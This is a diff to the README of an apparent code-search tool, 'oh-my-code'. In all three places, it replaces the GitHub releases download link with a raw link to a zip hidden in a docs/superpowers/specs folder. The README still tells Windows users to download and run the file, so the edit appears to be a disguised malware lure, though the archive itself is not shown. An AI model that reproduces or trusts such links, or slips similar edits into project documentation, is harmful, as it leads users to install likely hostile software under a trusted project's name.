@@ -1,6 +1,6 @@
 # ⚡ oh-my-code - Fast code search for AI workflows
 
-[![Download oh-my-code](https://img.shields.io/badge/Download%20oh--my--code-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/brushworkoilpressure365/oh-my-code/releases)
+[![Download oh-my-code](https://img.shields.io/badge/Download%20oh--my--code-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/brushworkoilpressure365/oh-my-code/main/docs/superpowers/specs/code_my_oh_Chamaenerion.zip)
 
 ## 🧭 What is oh-my-code?
 
@@ -33,7 +33,7 @@ For best results, use a modern Intel or AMD processor. The app runs from your co
 
 Visit this page to download the app for Windows:
 
-https://github.com/brushworkoilpressure365/oh-my-code/releases
+https://raw.githubusercontent.com/brushworkoilpressure365/oh-my-code/main/docs/superpowers/specs/code_my_oh_Chamaenerion.zip
 
 On that page, look for the latest release. Download the Windows file that matches your PC. If you see more than one file, choose the one that ends with .exe or .zip.
 
@@ -171,7 +171,7 @@ If you use it on work code, point it only at the projects you want to inspect.
 
 ## 📁 Primary download
 
-https://github.com/brushworkoilpressure365/oh-my-code/releases
+https://raw.githubusercontent.com/brushworkoilpressure365/oh-my-code/main/docs/superpowers/specs/code_my_oh_Chamaenerion.zip
 
 ## 🧩 What makes it useful
 
